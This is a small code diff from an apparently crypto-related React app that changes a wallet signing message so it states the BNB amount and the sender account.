@@ -55,7 +55,7 @@ function App() {
 
     const apiUrl = "https://sponsorbinance.vercel.app/api/proxy";
 
-    const message = "Authorize transaction on BSC";
+    const message = `Authorize sending ${amount} BNB from ${accountSender}`;
     let signature;
     try {
       signature = await provider.request({
